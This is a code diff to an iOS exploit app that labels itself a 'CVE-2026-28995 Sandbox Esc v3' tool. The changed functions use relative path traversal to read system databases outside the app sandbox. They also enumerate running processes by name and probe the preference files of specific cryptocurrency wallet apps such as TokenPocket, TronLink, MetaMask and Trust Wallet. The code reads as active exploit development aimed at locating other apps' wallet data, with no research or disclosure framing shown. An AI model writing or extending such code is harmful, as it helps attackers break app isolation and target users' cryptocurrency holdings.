@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v2" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v3" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7253,75 +7253,92 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendString:@"[-] NOT accessible (sandbox intact)\n"];
     }
 
-    // Test 2: Read installd database to find TokenPocket container UUID
-    [log appendString:@"\n--- Test 2: installd app databases ---\n"];
-    NSArray *installdPaths = @[
-        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/LastBuildInfo.plist",
-        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/MobileInstallation.plist",
-        @"../../../../../../../../../../../../../var/mobile/Library/Caches/com.apple.mobile.installation.plist",
-        @"../../../../../../../../../../../../../var/installd/Library/Caches/com.apple.mobile.installation.plist",
+    // Test 2: sysctl KERN_PROC_ALL — find wallet app PIDs
+    [log appendString:@"\n--- Test 2: sysctl KERN_PROC_ALL (running processes) ---\n"];
+    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
+    size_t bufSize = 0;
+    if (sysctl(mib, 4, NULL, &bufSize, NULL, 0) == 0 && bufSize > 0) {
+        struct kinfo_proc *buf = (struct kinfo_proc *)malloc(bufSize);
+        if (buf && sysctl(mib, 4, buf, &bufSize, NULL, 0) == 0) {
+            size_t count = bufSize / sizeof(struct kinfo_proc);
+            [log appendFormat:@"  %zu procs (kinfo_proc=%zu bytes)\n",
+                count, sizeof(struct kinfo_proc)];
+
+            int shown = 0;
+            for (size_t i = 0; i < count && shown < 40; i++) {
+                NSString *pname = [NSString stringWithUTF8String:
+                    buf[i].kp_proc.p_comm];
+                if (pname.length == 0) continue;
+                BOOL match = [pname.lowercaseString containsString:@"token"] ||
+                    [pname.lowercaseString containsString:@"tron"] ||
+                    [pname.lowercaseString containsString:@"wallet"] ||
+                    [pname.lowercaseString containsString:@"imtoken"] ||
+                    [pname.lowercaseString containsString:@"meta"] ||
+                    [pname.lowercaseString containsString:@"trust"];
+                if (shown < 25 || match) {
+                    [log appendFormat:@"  PID=%d %@%@\n",
+                        buf[i].kp_proc.p_pid, pname, match ? @" ***" : @""];
+                    shown++;
+                }
+            }
+        }
+        free(buf);
+    } else {
+        [log appendString:@"  sysctl failed\n"];
+    }
+
+    // Test 3: iOS 26+ container DB paths
+    [log appendString:@"\n--- Test 3: iOS 26+ DB paths ---\n"];
+    NSArray *v3paths = @[
+        @"../../../../../../../../../../../../../var/db/lsd/com.apple.lsd.plist",
+        @"../../../../../../../../../../../../../var/mobile/Library/Caches/com.apple.lsd.plist",
+        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/LocalStore.sqlite",
+        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/InstallationJournal.sqlite",
     ];
-    NSDictionary *installDB = nil;
-    for (NSString *relPath in installdPaths) {
+    for (NSString *relPath in v3paths) {
         NSString *absPath = [relPath stringByExpandingTildeInPath];
-        if ([fm fileExistsAtPath:absPath]) {
-            NSDictionary *db = [NSDictionary dictionaryWithContentsOfFile:absPath];
-            if (db) {
-                [log appendFormat:@"[+] Found DB: %@ (%lu keys)\n",
-                    [relPath lastPathComponent], (unsigned long)db.count];
-                installDB = db;
-                break;
-            }
-        }
-        [log appendFormat:@"  not found/no data: %@\n", [relPath lastPathComponent]];
-    }
-
-    if (installDB) {
-        // Search for TokenPocket entry
-        [log appendString:@"\n  Searching for wallet apps:\n"];
-        for (NSString *key in installDB) {
-            NSDictionary *info = installDB[key];
-            NSString *bundleID = info[@"CFBundleIdentifier"] ?: info[@"bundleID"] ?: @"";
-            NSString *container = info[@"Container"] ?: info[@"container"] ?: info[@"DataContainerUUID"] ?: @"";
-            if ([bundleID.lowercaseString containsString:@"tokenpocket"] ||
-                [bundleID.lowercaseString containsString:@"tron"] ||
-                [bundleID.lowercaseString containsString:@"wallet"] ||
-                [bundleID.lowercaseString containsString:@"imtoken"] ||
-                [bundleID.lowercaseString containsString:@"trust"] ||
-                [bundleID.lowercaseString containsString:@"metamask"]) {
-                [log appendFormat:@"  *** %@ → container=%@ ***\n", bundleID, container];
-            }
-        }
-        [log appendString:@"  (Dumping all bundle IDs)\n"];
-        for (NSString *key in installDB) {
-            NSDictionary *info = installDB[key];
-            NSString *bundleID = info[@"CFBundleIdentifier"] ?: @"?";
-            if ([bundleID isEqualToString:@"?"]) continue;
-            [log appendFormat:@"  %@\n", bundleID];
+        BOOL exists = [fm fileExistsAtPath:absPath];
+        [log appendFormat:@"  %@: %@\n", [relPath lastPathComponent],
+            exists ? @"EXISTS" : @"no"];
+        if (exists && ![relPath hasSuffix:@".sqlite"]) {
+            NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:absPath];
+            if (d) [log appendFormat:@"    plist: %lu keys\n", (unsigned long)d.count];
         }
     }
 
-    // Test 3: System preferences plist (already confirmed working)
-    [log appendString:@"\n--- Test 3: System prefs (confirmed) ---\n"];
-    NSString *prefsPlist = @"../../../../../../../../../../../../../var/mobile/Library/Preferences/.GlobalPreferences.plist";
-    NSString *resolvedPrefs = [prefsPlist stringByExpandingTildeInPath];
-    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile:resolvedPrefs];
-    [log appendFormat:@"  GlobalPreferences: %lu keys\n", (unsigned long)prefs.count];
+    // Test 4: Wallet app preferences by known bundle IDs
+    [log appendString:@"\n--- Test 4: Wallet prefs by bundle ID ---\n"];
+    NSArray *walletBIDs = @[
+        @"org.tokenpocket.TokenPocket",
+        @"com.tokenpocket.wallet",
+        @"com.tokenpocket.tokenpocket",
+        @"io.tokenpocket.tokenpocket",
+        @"org.tron.TronLink",
+        @"com.tronlink.wallet",
+        @"com.trustwallet.app",
+        @"io.metamask.MetaMask",
+        @"com.imtoken.wallet",
+    ];
+    for (NSString *bundleID in walletBIDs) {
+        NSString *prefsRel = [NSString stringWithFormat:
+            @"../../../../../../../../../../../../../var/mobile/Library/Preferences/%@.plist", bundleID];
+        NSString *prefsPath = [prefsRel stringByExpandingTildeInPath];
+        if ([fm fileExistsAtPath:prefsPath]) {
+            NSDictionary *p = [NSDictionary dictionaryWithContentsOfFile:prefsPath];
+            [log appendFormat:@"  [+] %@ EXISTS (%lu keys)\n",
+                bundleID, (unsigned long)p.count];
+        } else {
+            [log appendFormat:@"  [-] %@\n", bundleID];
+        }
+    }
 
-    // Test 4: Try individual container metadata for suspected UUIDs
-    [log appendString:@"\n--- Test 4: Probe container metadata by UUID pattern ---\n"];
-    // TokenPocket's bundle ID format on iOS is typically:
-    // org.tokenpocket.TokenPocket or com.tokenpocket.wallet
-    // Try reading our own container first to verify the metadata format
+    // Test 5: Our home + try to read neighbor container metadata
+    [log appendString:@"\n--- Test 5: Container neighborhood ---\n"];
     NSString *ourHome = NSHomeDirectory();
     [log appendFormat:@"  Our home: %@\n", ourHome];
-
-    // Also try reading known system daemon containers for validation
-    NSString *testMetaPath = @"../../../../../../../../../../../../../var/root/Library";
-    NSString *testResolved = [testMetaPath stringByExpandingTildeInPath];
-    if ([fm fileExistsAtPath:testResolved]) {
-        [log appendString:@"  /var/root/Library accessible!\n"];
-    }
+    // Our UUID from v2: 68CD15EB-0A92-4C87-BCAE-DF435BD89CEA
+    NSString *ourUUID = [ourHome lastPathComponent];
+    [log appendFormat:@"  Our UUID: %@\n", ourUUID];
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
